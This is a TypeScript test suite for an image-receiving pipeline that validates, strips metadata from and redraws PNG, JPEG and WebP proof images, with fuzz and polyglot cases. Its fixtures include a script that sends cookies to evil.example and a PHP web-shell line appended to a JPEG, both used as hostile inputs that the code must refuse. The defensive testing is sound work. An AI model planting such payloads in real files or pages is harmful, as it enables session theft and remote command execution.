// Row P-031 (job J-22): the receiving device checks a proof image, draws a fresh copy and shows only
// that copy. No virus-scanning service and no server antivirus (owner).
//
// The browser parts (createImageBitmap, OffscreenCanvas) are passed in, as in the web app's
// reencode tests: nothing in this repo gives Node a real canvas. For PNG the test passes a REAL
// decoder and encoder (node:zlib inflate, PNG unfiltering, a fresh PNG written from the pixels), so
// the valid round trip and the fuzzed PNGs that survive the header walk really are decoded. Node has
// no JPEG or WebP decoder here, so for those the stand-in decoder returns the header's size; what
// they test is the header walk and the refusals around the decode (the real browser decode is the
// Playwright work of Plan 5 Task 13).
import { inflateSync } from 'node:zlib';
import { describe, expect, it, vi } from 'vitest';
import {
  ProofReceiveError,
  assertClean,
  RECEIVE_MAX_BYTES,
  RECEIVE_MAX_RENDER_BYTES,
  RECEIVE_MAX_SIDE,
  type ReceiveBitmap,
  type ReceiveDeclared,
  type ReceiveDeps,
  type ReceiveMime,
  readImageHeader,
  receiveProof,
} from '../src/index.js';
import { PNG_H, PNG_SIGNATURE, PNG_W, cleanJpeg, cleanPng, concat, jpegCore, metadataJpeg, metadataPng, pngChunk, pngRaw, webp, zlibStored } from './fixtures.js';

const latin1 = (s: string): Uint8Array => Uint8Array.from(s, (c) => c.charCodeAt(0));
const has = (bytes: Uint8Array, s: string): boolean => Buffer.from(bytes).includes(Buffer.from(s, 'latin1'));
const SCRIPT = latin1('<script>fetch("https://evil.example/"+document.cookie)</script>');

// ---------------------------------------------------------------------------------------------
// Builders

function ihdr(w: number, h: number, depth = 8, colour = 2): Uint8Array {
  const d = new Uint8Array(13);
  const v = new DataView(d.buffer);
  v.setUint32(0, w);
  v.setUint32(4, h);
  d[8] = depth;
  d[9] = colour;
  return pngChunk('IHDR', d);
}

const IEND = pngChunk('IEND', new Uint8Array(0));

function png(w: number, h: number, raw: Uint8Array, ...extra: Uint8Array[]): Uint8Array {
  return concat(PNG_SIGNATURE, ihdr(w, h), ...extra, pngChunk('IDAT', zlibStored(raw)), IEND);
}

function riff(...chunks: Uint8Array[]): Uint8Array {
  const body = concat(latin1('WEBP'), ...chunks);
  const size = new Uint8Array(4);
  new DataView(size.buffer).setUint32(0, body.length, true);
  return concat(latin1('RIFF'), size, body);
}

function webpChunk(fourcc: string, data: Uint8Array): Uint8Array {
  const head = new Uint8Array(8);
  head.set(latin1(fourcc));
  new DataView(head.buffer).setUint32(4, data.length, true);
  return concat(head, data, data.length % 2 ? new Uint8Array(1) : new Uint8Array(0));
}

/** A lossless WebP header of w x h. */
function vp8l(w: number, h: number): Uint8Array {
  const bits = ((w - 1) & 0x3fff) | (((h - 1) & 0x3fff) << 14);
  const d = new Uint8Array(5);
  d[0] = 0x2f;
  new DataView(d.buffer).setUint32(1, bits >>> 0, true);
  return webpChunk('VP8L', d);
}

/** A lossy WebP key frame header of w x h. */
function vp8(w: number, h: number): Uint8Array {
  const d = new Uint8Array(10);
  d[0] = 0x10; // key frame, version 0, shown, first partition size 0
  d.set([0x9d, 0x01, 0x2a], 3);
  const v = new DataView(d.buffer);
  v.setUint16(6, w, true);
  v.setUint16(8, h, true);
  return webpChunk('VP8 ', d);
}

function vp8x(w: number, h: number, flags = 0): Uint8Array {
  const d = new Uint8Array(10);
  d[0] = flags;
  const cw = w - 1;
  const ch = h - 1;
  d.set([cw & 0xff, (cw >> 8) & 0xff, (cw >> 16) & 0xff, ch & 0xff, (ch >> 8) & 0xff, (ch >> 16) & 0xff], 4);
  return webpChunk('VP8X', d);
}

function jpegWithSize(w: number, h: number): Uint8Array {
  const b = cleanJpeg().slice();
  // jpegCore: SOI (2) + DQT (4 + 65) puts SOF0 at 71; its height and width are at +5 and +7.
  expect(b[71 + 1]).toBe(0xc0);
  b[76] = h >> 8;
  b[77] = h & 0xff;
  b[78] = w >> 8;
  b[79] = w & 0xff;
  return b;
}

/** Rewrite every PNG chunk CRC so a mutation inside chunk data reaches the decoder. */
function fixCrcs(b: Uint8Array): Uint8Array {
  const out = b.slice();
  const v = new DataView(out.buffer);
  for (let at = 8; at + 12 <= out.length; ) {
    const len = v.getUint32(at);
    if (at + 12 + len > out.length) break;
    const fixed = pngChunk(String.fromCharCode(...out.subarray(at + 4, at + 8)), out.slice(at + 8, at + 8 + len));
    out.set(fixed, at);
    at += 12 + len;
  }
  return out;
}

// ---------------------------------------------------------------------------------------------
// Stand-ins for the browser

interface Pixels extends ReceiveBitmap {
  rgba: Uint8Array | null;
}

/** A real decoder for 8-bit, non-interlaced RGB and RGBA PNGs; anything else it cannot decode. */
function decodePng(b: Uint8Array): Pixels {
  const v = new DataView(b.buffer, b.byteOffset, b.byteLength);
  let width = 0;
  let height = 0;
  let colour = 0;
  const idat: Uint8Array[] = [];
  for (let at = 8; at < b.length; ) {
    const len = v.getUint32(at);
    const type = String.fromCharCode(...b.subarray(at + 4, at + 8));
    const data = b.subarray(at + 8, at + 8 + len);
    if (type === 'IHDR') {
      width = v.getUint32(at + 8);
      height = v.getUint32(at + 12);
      if (data[8] !== 8 || (data[9] !== 2 && data[9] !== 6) || data[12] !== 0) throw new Error('decoder: not supported');
      colour = data[9]!;
    }
    if (type === 'IDAT') idat.push(data);
    at += 12 + len;
  }
  const bpp = colour === 6 ? 4 : 3;
  const raw = inflateSync(Buffer.concat(idat));
  const stride = width * bpp;
  if (raw.length !== height * (1 + stride)) throw new Error('decoder: wrong data length');
  const rgba = new Uint8Array(width * height * 4);
  let prev = new Uint8Array(stride);
  for (let y = 0; y < height; y++) {
    const f = raw[y * (1 + stride)]!;
    const line = Uint8Array.from(raw.subarray(y * (1 + stride) + 1, (y + 1) * (1 + stride)));
    for (let i = 0; i < stride; i++) {
      const a = i >= bpp ? line[i - bpp]! : 0;
      const up = prev[i]!;
      const c = i >= bpp ? prev[i - bpp]! : 0;
      const p = a + up - c;
      const pa = Math.abs(p - a);
      const pb = Math.abs(p - up);
      const pc = Math.abs(p - c);
      const pred = [0, a, up, (a + up) >> 1, pa <= pb && pa <= pc ? a : pb <= pc ? up : c][f];
      if (pred === undefined) throw new Error('decoder: bad filter');
      line[i] = (line[i]! + pred) & 0xff;
    }
    for (let x = 0; x < width; x++) {
      rgba.set([line[x * bpp]!, line[x * bpp + 1]!, line[x * bpp + 2]!, bpp === 4 ? line[x * bpp + 3]! : 255], (y * width + x) * 4);
    }
    prev = line;
  }
  return { width, height, rgba };
}

/** A fresh RGBA PNG from pixels, with a browser-style ancillary chunk the pipeline must drop. */
function encodePng(p: Pixels, w: number, h: number): Uint8Array {
  const raw = new Uint8Array(h * (1 + w * 4));
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      const px = p.rgba ? p.rgba.subarray((y * w + x) * 4, (y * w + x) * 4 + 4) : Uint8Array.of(128, 128, 128, 255);
      raw.set(px, y * (1 + w * 4) + 1 + x * 4);
    }
  }
  return concat(PNG_SIGNATURE, ihdr(w, h, 8, 6), pngChunk('sRGB', Uint8Array.of(0)), pngChunk('IDAT', zlibStored(raw)), IEND);
}

function deps(over: Partial<ReceiveDeps> = {}) {
  const close = vi.fn();
  /** Bitmaps the decoder handed out; each must be closed exactly once. */
  const opened = { n: 0 };
  const decode = vi.fn(async (bytes: Uint8Array, mime: ReceiveMime): Promise<Pixels> => {
    // Stand-in for JPEG and WebP: no decoder for them in Node.
    const p: Pixels = mime === 'image/png' ? decodePng(bytes) : { ...readImageHeader(bytes), rgba: null };
    opened.n++;
    return { width: p.width, height: p.height, rgba: p.rgba, close };
  });
  const render = vi.fn(async (b: ReceiveBitmap, w: number, h: number) => encodePng(b as Pixels, w, h));
  const d: ReceiveDeps = { decode: over.decode ?? decode, render: over.render ?? render };
  return { d, decode, render, close, opened };
}

async function code(p: Promise<unknown>): Promise<string> {
  try {
    await p;
  } catch (e) {
    if (e instanceof ProofReceiveError) return e.code;
    throw e; // anything else fails the test
  }
  return 'accepted';
}

const PNG_DECL = { mime: 'image/png', width: PNG_W, height: PNG_H } as const;
/** An envelope for an input refused before its size is compared: the size is required, its value moot. */
const decl = (mime: string, width = PNG_W, height = PNG_H): ReceiveDeclared => ({ mime, width, height });
/** The envelope for a fuzzed input: its own header's size when that parses (so the decode is reached), else the seed's. */
function declaredFor(b: Uint8Array, mime: ReceiveMime, seed: Uint8Array): ReceiveDeclared {
  for (const src of [b, seed]) {
    try {
      const h = readImageHeader(src);
      return { mime, width: h.width, height: h.height };
    } catch {
      // not a readable header: try the seed
    }
  }
  return decl(mime);
}

// ---------------------------------------------------------------------------------------------

describe('readImageHeader', () => {
  it('reads PNG, JPEG and WebP sizes without decoding', () => {
    expect(readImageHeader(cleanPng())).toEqual({ mime: 'image/png', width: 4, height: 3 });
    expect(readImageHeader(metadataPng())).toEqual({ mime: 'image/png', width: 4, height: 3 });
    expect(readImageHeader(cleanJpeg())).toEqual({ mime: 'image/jpeg', width: 8, height: 8 });
    expect(readImageHeader(metadataJpeg())).toEqual({ mime: 'image/jpeg', width: 8, height: 8 });
    expect(readImageHeader(riff(vp8l(640, 480)))).toEqual({ mime: 'image/webp', width: 640, height: 480 });
    expect(readImageHeader(riff(vp8(1080, 2400)))).toEqual({ mime: 'image/webp', width: 1080, height: 2400 });
    expect(readImageHeader(riff(vp8x(300, 200), webpChunk('ICCP', latin1('icc')), vp8l(300, 200)))).toEqual({ mime: 'image/webp', width: 300, height: 200 });
  });
});

describe('receiveProof: a valid image', () => {
  it('PNG round trip: really decoded, drawn again, and the fresh copy has the same pixels', async () => {
    const { d, decode, render, close } = deps();
    const input = cleanPng();
    const out = await receiveProof(input, PNG_DECL, d);
    expect(out).toMatchObject({ width: 4, height: 3 });
    expect(decode).toHaveBeenCalledTimes(1);
    expect(render).toHaveBeenCalledTimes(1);
    expect(close).toHaveBeenCalledTimes(1);
    // A different file from the one received, carrying only the allowed chunks.
    expect(Buffer.from(out.png).equals(Buffer.from(input))).toBe(false);
    expect(has(out.png, 'sRGB')).toBe(false);
    const a = decodePng(input).rgba!;
    const b = decodePng(out.png).rgba!;
    expect(Buffer.from(b).equals(Buffer.from(a))).toBe(true);
    // The received bytes are copied before decode, so the caller's buffer is never handed out.
    expect(decode.mock.calls[0]![0]).not.toBe(input);
  });

  it('PNG metadata never reaches the fresh copy', async () => {
    const out = await receiveProof(metadataPng(), PNG_DECL, deps().d);
    for (const s of ['GPS', 'Jane Doe', 'Pixel 9', 'xmpmeta', 'tEXt', 'eXIf', 'iCCP']) expect(has(out.png, s), s).toBe(false);
  });

  it('a PNG carrying script bytes inside a text chunk is shown only as the redrawn pixels', async () => {
    const out = await receiveProof(png(PNG_W, PNG_H, pngRaw(), pngChunk('tEXt', concat(latin1('Comment\0'), SCRIPT))), PNG_DECL, deps().d);
    expect(has(out.png, '<script')).toBe(false);
  });

  it('JPEG and WebP: the header is walked and the copy shown is a fresh PNG', async () => {
    for (const [bytes, mime, w, h] of [
      [metadataJpeg(), 'image/jpeg', 8, 8],
      [riff(vp8l(64, 32)), 'image/webp', 64, 32],
      [riff(vp8(48, 48)), 'image/webp', 48, 48],
      [riff(vp8x(20, 10), webpChunk('EXIF', concat(latin1('GPS '), SCRIPT)), vp8l(20, 10)), 'image/webp', 20, 10],
    ] as const) {
      const out = await receiveProof(bytes, { mime, width: w, height: h }, deps().d);
      expect(readImageHeader(out.png)).toEqual({ mime: 'image/png', width: w, height: h });
      for (const s of ['<script', 'Exif', 'GPS', 'JFIF']) expect(has(out.png, s), s).toBe(false);
    }
  });

  it('a side of exactly RECEIVE_MAX_SIDE is accepted', async () => {
    expect(RECEIVE_MAX_SIDE).toBe(2600);
    const out = await receiveProof(riff(vp8l(RECEIVE_MAX_SIDE, 1)), { mime: 'image/webp', width: RECEIVE_MAX_SIDE, height: 1 }, deps().d);
    expect(out.width).toBe(2600);
  });
});

describe('receiveProof: only the picture reaches the decoder (review of 9 Nov 2026, F2)', () => {
  // Browsers apply an Exif orientation tag when they decode: createImageBitmap's `imageOrientation:
  // 'none'` is deprecated and read as `'from-image'`, and nothing else turns it off. So a tag that
  // the sender never attested could turn or mirror the picture this device shows, and an ICC profile
  // could recolour it. The decoder is therefore handed the picture with every metadata chunk or
  // segment removed, and nothing more.
  const jpegSegment = (marker: number, body: Uint8Array): Uint8Array =>
    concat(Uint8Array.of(0xff, marker, (body.length + 2) >> 8, (body.length + 2) & 0xff), body);
  /** A real Exif block (big-endian TIFF, one IFD entry): Orientation (0x0112) = 6, "rotate 90 degrees clockwise". */
  const EXIF_ROTATED = jpegSegment(
    0xe1,
    concat(latin1('Exif\0\0MM\0*\0\0\0\x08'), Uint8Array.of(0, 1, 0x01, 0x12, 0, 3, 0, 0, 0, 1, 0, 6, 0, 0, 0, 0, 0, 0)),
  );
  const SOI_EOI = [Uint8Array.of(0xff, 0xd8), Uint8Array.of(0xff, 0xd9)] as const;

  it('a JPEG with an Exif orientation tag: the decoder sees no APP segment at all, and a clean image of the same size', async () => {
    const [dqt, sof0, dht, dri, scan] = jpegCore();
    const rotated = concat(SOI_EOI[0], EXIF_ROTATED, dqt!, sof0!, dht!, dri!, scan!, SOI_EOI[1]);
    expect(has(rotated, 'Exif')).toBe(true);
    const { d, decode } = deps();
    await receiveProof(rotated, { mime: 'image/jpeg', width: 8, height: 8 }, d);
    expect(decode).toHaveBeenCalledTimes(1);
    const given = decode.mock.calls[0]![0];
    expect(has(given, 'Exif')).toBe(false);
    for (let i = 0; i + 1 < given.length; i++) expect(given[i] === 0xff && given[i + 1]! >= 0xe0 && given[i + 1]! <= 0xef, `APPn at ${i}`).toBe(false);
    expect(readImageHeader(given)).toEqual({ mime: 'image/jpeg', width: 8, height: 8 });
    expect(() => assertClean(given)).not.toThrow();
  });

  it('JPEG and PNG metadata (Exif, GPS, JFIF, XMP, ICC, text, Photoshop) never reaches the decoder', async () => {
    for (const [bytes, declared] of [
      [metadataJpeg(), { mime: 'image/jpeg', width: 8, height: 8 }],
      [metadataPng(), PNG_DECL],
    ] as const) {
      const { d, decode } = deps();
      await receiveProof(bytes, declared, d);
      const given = decode.mock.calls[0]![0];
      for (const s of ['Exif', 'GPS', 'JFIF', 'Photoshop', 'Jane Doe', 'Pixel 9', 'xmpmeta', 'Created with', 'tEXt', 'eXIf', 'iCCP', 'iTXt']) expect(has(given, s), s).toBe(false);
      expect(readImageHeader(given)).toEqual(readImageHeader(bytes));
      expect(() => assertClean(given)).not.toThrow();
      expect(given).not.toBe(bytes);
    }
  });

  it('a WebP: the EXIF, XMP and ICCP chunks go, the VP8X flags keep only alpha, and the RIFF size still fits the file', async () => {
    const exif = webpChunk('EXIF', concat(latin1('MM\0*\0\0\0\x08'), Uint8Array.of(0, 1, 0x01, 0x12, 0, 3, 0, 0, 0, 1, 0, 6, 0, 0, 0, 0, 0, 0)));
    const xmp = webpChunk('XMP ', latin1('<x:xmpmeta>GPS</x:xmpmeta>'));
    const icc = webpChunk('ICCP', latin1('profile'));
    // Flags: ICC (0x20), alpha (0x10), Exif (0x08), XMP (0x04).
    const extended = riff(vp8x(20, 10, 0x20 | 0x10 | 0x08 | 0x04), icc, vp8l(20, 10), exif, xmp);
    const { d, decode } = deps();
    await receiveProof(extended, { mime: 'image/webp', width: 20, height: 10 }, d);
    const given = decode.mock.calls[0]![0];
    for (const s of ['EXIF', 'XMP ', 'ICCP', 'xmpmeta', 'GPS', 'profile']) expect(has(given, s), s).toBe(false);
    expect(has(given, 'VP8X')).toBe(true);
    expect(has(given, 'VP8L')).toBe(true);
    expect(given[20]).toBe(0x10);
    expect(readImageHeader(given)).toEqual({ mime: 'image/webp', width: 20, height: 10 });

    // A simple-format WebP is one image chunk already: handed over as it is, in a copy.
    const simple = riff(vp8l(4, 4));
    const s = deps();
    await receiveProof(simple, { mime: 'image/webp', width: 4, height: 4 }, s.d);
    const givenSimple = s.decode.mock.calls[0]![0];
    expect(Buffer.from(givenSimple).equals(Buffer.from(simple))).toBe(true);
    expect(givenSimple).not.toBe(simple);
  });
});

describe('receiveProof: refusals before any decode', () => {
  it('refuses a declared type other than PNG, JPEG or WebP', async () => {
    for (const mime of ['image/gif', 'image/svg+xml', 'text/html', 'application/pdf', 'image/heic', 'IMAGE/PNG', '']) {
      const { d, decode } = deps();
      expect(await code(receiveProof(cleanPng(), decl(mime), d)), mime).toBe('unsupported');
      expect(decode).not.toHaveBeenCalled();
    }
  });

  it('wrong magic: bytes of another type than declared, or of no image type, are refused', async () => {
    const flipped = cleanPng();
    flipped[1] = 0x51;
    const html = latin1('<html><script>alert(1)</script></html>');
    const gif = concat(latin1('GIF89a'), Uint8Array.of(1, 0, 1, 0, 0, 0, 0), latin1(';'));
    for (const [bytes, mime] of [
      [cleanPng(), 'image/jpeg'],
      [cleanJpeg(), 'image/png'],
      [riff(vp8l(4, 4)), 'image/png'],
      [flipped, 'image/png'],
      [html, 'image/png'],
      [gif, 'image/png'],
      [new Uint8Array(0), 'image/jpeg'],
      [latin1('RIFF\0\0\0\0WEBQVP8L'), 'image/webp'],
    ] as const) {
      const { d, decode } = deps();
      expect(await code(receiveProof(bytes, decl(mime), d))).toBe('unsupported');
      expect(decode).not.toHaveBeenCalled();
    }
  });

  it('truncated at every length: refused, never decoded, never another error', async () => {
    for (const [bytes, mime] of [
      [cleanPng(), 'image/png'],
      [metadataPng(), 'image/png'],
      [cleanJpeg(), 'image/jpeg'],
      [metadataJpeg(), 'image/jpeg'],
      [riff(vp8l(16, 16)), 'image/webp'],
      [riff(vp8(16, 16)), 'image/webp'],
      [riff(vp8x(16, 16), vp8l(16, 16)), 'image/webp'],
    ] as const) {
      for (let n = 0; n < bytes.length; n++) {
        const { d, decode } = deps();
        const c = await code(receiveProof(bytes.subarray(0, n), decl(mime), d));
        expect(['undecodable', 'unsupported'], `${mime} cut at ${n}`).toContain(c);
        expect(decode).not.toHaveBeenCalled();
      }
    }
  });

  it('oversized header dimensions: too-large before decode, whatever the body', async () => {
    const cases: [Uint8Array, ReceiveMime][] = [
      [png(12_000, 12_000, pngRaw()), 'image/png'],
      [png(RECEIVE_MAX_SIDE + 1, 1, pngRaw()), 'image/png'],
      [png(1, 0x7fffffff, pngRaw()), 'image/png'],
      [jpegWithSize(65_535, 65_535), 'image/jpeg'],
      [jpegWithSize(RECEIVE_MAX_SIDE + 1, 8), 'image/jpeg'],
      [riff(vp8l(16_384, 16_384)), 'image/webp'],
      [riff(vp8(16_383, 2)), 'image/webp'],
      [riff(vp8x(1 << 14, 1 << 14), vp8l(1 << 14, 1 << 14)), 'image/webp'],
      [riff(vp8x(1 << 24, 3000), webpChunk('ICCP', latin1('x'))), 'image/webp'],
    ];
    for (const [bytes, mime] of cases) {
      const { d, decode } = deps();
      expect(await code(receiveProof(bytes, decl(mime), d))).toBe('too-large');
      expect(decode).not.toHaveBeenCalled();
    }
    const { d, decode } = deps();
    expect(await code(receiveProof(new Uint8Array(RECEIVE_MAX_BYTES + 1).fill(0x89), decl('image/png'), d))).toBe('too-large');
    expect(decode).not.toHaveBeenCalled();
  });

  it('malformed headers: zero sizes, bad PNG fields, a VP8X canvas unlike its image, a second frame', async () => {
    const cases: [Uint8Array, ReceiveMime][] = [
      [png(0, 3, pngRaw()), 'image/png'],
      [concat(PNG_SIGNATURE, ihdr(4, 3, 7, 2), pngChunk('IDAT', zlibStored(pngRaw())), IEND), 'image/png'],
      [concat(PNG_SIGNATURE, ihdr(4, 3, 8, 3), pngChunk('IDAT', zlibStored(pngRaw())), IEND), 'image/png'], // palette with no PLTE
      [concat(PNG_SIGNATURE, pngChunk('IDAT', zlibStored(pngRaw())), ihdr(4, 3), IEND), 'image/png'],
      [concat(PNG_SIGNATURE, ihdr(4, 3), pngChunk('IDAT', zlibStored(pngRaw())), pngChunk('tEXt', latin1('a\0b')), pngChunk('IDAT', new Uint8Array(1)), IEND), 'image/png'],
      [concat(PNG_SIGNATURE, ihdr(4, 3), pngChunk('ABCD', new Uint8Array(1)), pngChunk('IDAT', zlibStored(pngRaw())), IEND), 'image/png'],
      [jpegWithSize(8, 0), 'image/jpeg'],
      [jpegWithSize(0, 8), 'image/jpeg'],
      [riff(vp8x(300, 200), vp8l(301, 200)), 'image/webp'],
      [riff(vp8x(300, 200)), 'image/webp'],
      [riff(vp8l(4, 4), vp8l(4, 4)), 'image/webp'],
      [riff(webpChunk('JUNK', SCRIPT)), 'image/webp'],
    ];
    for (const [bytes, mime] of cases) {
      const { d, decode } = deps();
      expect(await code(receiveProof(bytes, decl(mime), d))).toBe('undecodable');
      expect(decode).not.toHaveBeenCalled();
    }
  });

  it('animations are refused: APNG acTL, a WebP animation flag or ANMF frame', async () => {
    const actl = pngChunk('acTL', Uint8Array.of(0, 0, 0, 2, 0, 0, 0, 0));
    for (const [bytes, mime] of [
      [png(PNG_W, PNG_H, pngRaw(), actl), 'image/png'],
      [webp(), 'image/webp'],
      [riff(vp8x(4, 4), webpChunk('ANIM', new Uint8Array(6)), webpChunk('ANMF', new Uint8Array(16))), 'image/webp'],
    ] as const) {
      const { d, decode } = deps();
      expect(await code(receiveProof(bytes, decl(mime), d))).toBe('unsupported');
      expect(decode).not.toHaveBeenCalled();
    }
  });

  it('polyglots: script bytes after the end marker are refused for every type', async () => {
    const webpTail = concat(riff(vp8l(4, 4)), SCRIPT); // RIFF size no longer the file
    const webpGrown = (() => {
      const b = concat(riff(vp8l(4, 4)), SCRIPT, SCRIPT.length % 2 ? new Uint8Array(1) : new Uint8Array(0));
      new DataView(b.buffer).setUint32(4, b.length - 8, true); // RIFF size covers the script: not a chunk
      return b;
    })();
    for (const [bytes, mime] of [
      [concat(cleanPng(), SCRIPT), 'image/png'],
      [concat(cleanPng(), latin1('PK\x03\x04'), SCRIPT), 'image/png'],
      [concat(cleanJpeg(), SCRIPT), 'image/jpeg'],
      [concat(metadataJpeg(), latin1('\n<?php system($_GET[0]); ?>')), 'image/jpeg'],
      [webpTail, 'image/webp'],
      [webpGrown, 'image/webp'],
    ] as const) {
      const { d, decode } = deps();
      expect(await code(receiveProof(bytes, decl(mime), d))).toBe('undecodable');
      expect(decode).not.toHaveBeenCalled();
    }
  });

  it('an envelope without a size is refused before decode: the size match is never skipped', async () => {
    for (const declared of [{ mime: 'image/png' }, { mime: 'image/png', width: PNG_W }, { mime: 'image/png', height: PNG_H }]) {
      const { d, decode } = deps();
      expect(await code(receiveProof(cleanPng(), declared as unknown as ReceiveDeclared, d)), JSON.stringify(declared)).toBe('undecodable');
      expect(decode).not.toHaveBeenCalled();
    }
  });

  it('a header size unlike the envelope\'s declared size is refused', async () => {
    const { d, decode } = deps();
    expect(await code(receiveProof(cleanPng(), { mime: 'image/png', width: 4, height: 4 }, d))).toBe('undecodable');
    expect(await code(receiveProof(cleanPng(), { mime: 'image/png', width: 3, height: 3 }, d))).toBe('undecodable');
    expect(decode).not.toHaveBeenCalled();
  });
});

describe('receiveProof: refusals around the decode and the redraw', () => {
  it('a decoder failure is undecodable (a PNG whose compressed data is broken, CRCs right)', async () => {
    const b = cleanPng().slice();
    // Break the zlib header of the first IDAT (chunk at 8 + 25 = 33, data at 41), then fix CRCs.
    b[41] = 0x00;
    const { d, decode, render } = deps();
    expect(await code(receiveProof(fixCrcs(b), PNG_DECL, d))).toBe('undecodable');
    expect(decode).toHaveBeenCalledTimes(1);
    expect(render).not.toHaveBeenCalled();
  });

  it('a decoder that rejects, or returns a picture of another size, is undecodable; the bitmap is closed', async () => {
    const close = vi.fn();
    expect(await code(receiveProof(cleanPng(), PNG_DECL, deps({ decode: async () => Promise.reject(new Error('x')) }).d))).toBe('undecodable');
    expect(await code(receiveProof(cleanPng(), PNG_DECL, deps({ decode: () => { throw new TypeError('sync'); } }).d))).toBe('undecodable');
    expect(await code(receiveProof(cleanPng(), PNG_DECL, deps({ decode: async () => ({ width: 5, height: 3, close }) }).d))).toBe('undecodable');
    expect(close).toHaveBeenCalledTimes(1);
  });

  it('a redraw that fails, or is not a sound PNG of the same size, is render-failed; the bitmap is still closed', async () => {
    const outputs: (() => Promise<Uint8Array>)[] = [
      async () => Promise.reject(new Error('no canvas')),
      async () => cleanJpeg(),
      async () => png(5, 3, new Uint8Array(3 * 16)),
      async () => cleanPng().subarray(0, 40),
      async () => concat(cleanPng(), SCRIPT),
      async () => 'not bytes' as unknown as Uint8Array,
    ];
    for (const out of outputs) {
      const { d, close } = deps();
      expect(await code(receiveProof(cleanPng(), PNG_DECL, { decode: d.decode, render: out }))).toBe('render-failed');
      expect(close).toHaveBeenCalledTimes(1);
    }
  });

  it('a fresh copy over RECEIVE_MAX_RENDER_BYTES is render-failed before it is walked; one of exactly the cap is accepted', async () => {
    // 28 MiB: above the largest decodable proof (2600 x 2600 as an uncompressed RGBA PNG, about 27 MB),
    // below Firefox's 32 MB data: URL limit. A real proof's copy is never refused on size.
    expect(RECEIVE_MAX_RENDER_BYTES).toBe(28 * 1024 * 1024);
    expect(RECEIVE_MAX_RENDER_BYTES).toBeGreaterThan(RECEIVE_MAX_SIDE * RECEIVE_MAX_SIDE * 4 + RECEIVE_MAX_SIDE + 1024);
    // A sound PNG of the right size whose bulk is one text chunk: the only thing wrong is its byte count.
    const padded = (total: number): Uint8Array => {
      const base = png(PNG_W, PNG_H, pngRaw());
      return png(PNG_W, PNG_H, pngRaw(), pngChunk('tEXt', new Uint8Array(total - base.length - 12)));
    };
    const over = padded(RECEIVE_MAX_RENDER_BYTES + 1);
    expect(over.length).toBe(RECEIVE_MAX_RENDER_BYTES + 1);
    const { d, close } = deps();
    expect(await code(receiveProof(cleanPng(), PNG_DECL, { decode: d.decode, render: async () => over }))).toBe('render-failed');
    expect(close).toHaveBeenCalledTimes(1);

    const exact = padded(RECEIVE_MAX_RENDER_BYTES);
    expect(exact.length).toBe(RECEIVE_MAX_RENDER_BYTES);
    const out = await receiveProof(cleanPng(), PNG_DECL, { decode: deps().d.decode, render: async () => exact });
    expect(readImageHeader(out.png)).toEqual({ mime: 'image/png', width: PNG_W, height: PNG_H });
    expect(out.png.length).toBeLessThan(RECEIVE_MAX_BYTES);
  });
});

describe('receiveProof: fuzz', () => {
  // A small seeded PRNG (mulberry32) so a failure always reproduces.
  function rng(seed: number): () => number {
    let a = seed >>> 0;
    return () => {
      a = (a + 0x6d2b79f5) >>> 0;
      let t = a;
      t = Math.imul(t ^ (t >>> 15), t | 1);
      t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }

  function mutate(src: Uint8Array, r: () => number): Uint8Array {
    let b: Uint8Array = src.slice();
    const n = 1 + Math.floor(r() * 4);
    for (let k = 0; k < n; k++) {
      const at = Math.floor(r() * b.length);
      const op = Math.floor(r() * 5);
      if (op === 0) b[at] = Math.floor(r() * 256);
      else if (op === 1) b[at] = b[at]! ^ (1 << Math.floor(r() * 8));
      else if (op === 2) b = concat(b.subarray(0, at), b.subarray(at + 1 + Math.floor(r() * 8)));
      else if (op === 3) b = concat(b.subarray(0, at), Uint8Array.from({ length: 1 + Math.floor(r() * 8) }, () => Math.floor(r() * 256)), b.subarray(at));
      else b = concat(b.subarray(0, at), Uint8Array.of(0xff, 0xff, 0xff, 0xff), b.subarray(at + 4)); // size fields to the maximum
    }
    return b;
  }

  const seeds: [string, Uint8Array, ReceiveMime][] = [
    ['png', cleanPng(), 'image/png'],
    ['png-meta', metadataPng(), 'image/png'],
    ['jpeg', cleanJpeg(), 'image/jpeg'],
    ['jpeg-meta', metadataJpeg(), 'image/jpeg'],
    ['webp-vp8l', riff(vp8l(32, 32)), 'image/webp'],
    ['webp-vp8', riff(vp8(32, 32)), 'image/webp'],
    ['webp-vp8x', riff(vp8x(32, 32), webpChunk('ICCP', latin1('profile')), vp8l(32, 32)), 'image/webp'],
  ];

  for (const [name, src, mime] of seeds) {
    it(`${name}: 1500 mutated inputs are each refused with a ProofReceiveError or shown only as a sound fresh PNG`, async () => {
      const r = rng(0x5eed ^ name.length * 7919);
      let refused = 0;
      for (let i = 0; i < 1500; i++) {
        // Half of the PNG mutations get their CRCs fixed, so they reach the real decoder.
        let b = mutate(src, r);
        if (mime === 'image/png' && i % 2 === 0) b = fixCrcs(b);
        const { d, close, opened } = deps();
        let c: string;
        try {
          const out = await receiveProof(b, declaredFor(b, mime, src), d);
          c = 'accepted';
          const h = readImageHeader(out.png);
          expect(h.mime).toBe('image/png');
          expect(h.width).toBeLessThanOrEqual(RECEIVE_MAX_SIDE);
          expect(h.height).toBeLessThanOrEqual(RECEIVE_MAX_SIDE);
          expect(has(out.png, '<script')).toBe(false);
        } catch (e) {
          expect(e, `${name} #${i}`).toBeInstanceOf(ProofReceiveError);
          c = (e as ProofReceiveError).code;
          refused++;
        }
        expect(['accepted', 'unsupported', 'too-large', 'undecodable', 'render-failed']).toContain(c);
        // Whatever happened, every decoded bitmap was released.
        expect(close).toHaveBeenCalledTimes(opened.n);
      }
      expect(refused).toBeGreaterThan(1000);
    });
  }

  it('polyglot fuzz: random script-like bytes appended to every valid image are always refused', async () => {
    const r = rng(42);
    for (let i = 0; i < 300; i++) {
      const tail = Uint8Array.from({ length: 1 + Math.floor(r() * 64) }, () => 0x20 + Math.floor(r() * 0x5f));
      const [, src, mime] = seeds[i % seeds.length]!;
      const { d, decode } = deps();
      expect(await code(receiveProof(concat(src, tail), decl(mime), d))).toBe('undecodable');
      expect(decode).not.toHaveBeenCalled();
    }
  });
});
